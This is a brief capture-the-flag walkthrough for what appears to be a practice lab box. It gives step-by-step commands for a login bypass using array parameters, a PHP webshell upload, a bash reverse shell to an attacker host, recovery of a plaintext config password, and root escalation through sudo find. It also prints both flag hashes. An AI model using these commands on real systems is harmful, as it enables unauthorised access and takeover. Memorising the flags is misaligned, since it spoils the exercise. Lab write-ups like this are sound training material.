[[ping]] the host
sudo nmap -sV -sC --min-rate=1000 \[target host IP]
*Navigate to website on browser and click login, then remove login.php.*
strings  login.php.swp
strings login.php.swp >> file.txt
tac file.txt
*turn on Proxy in Firefox and start Burpsuite. Intercept login request and change as follows:*
username[]=admin&password[]=pass

*upload file:*
echo "\<?php phpinfo(); ?>" > test.php

gobuster dir --url http://[target host IP]/ --wordlist /usr/share/wordlists/dirb/big.txt
*navigate to http://[target host IP]/_uploaded*

*upload file*
echo "\<?php echo system($\_REQUEST['cmd']);?>" > webshell.php
http://[target host IP]/_uploaded/webshell.php?cmd=id

sudo nc -lvnp 6666
*Intercept request and change method to POST with following payload, with URL-encoding:*
/bin/bash -c 'bash -i >& /dev/tcp/\[attacker host/LISTENING_PORT 0>&1'

cat /var/www/html/login/config.php
*\<?php
$username = "admin";
$password = "thisisagoodpassword";*

ssh john@\[target host IP]
cat user.txt *f54846c258f3b4612f78a819573d158e*

sudo find . -exec /bin/sh \\; -quit
whoami && id

find / -type f -name "root.txt" 2>/dev/null
cat /root/root.txt *51709519ea18ab37dd6fc58096bea949*
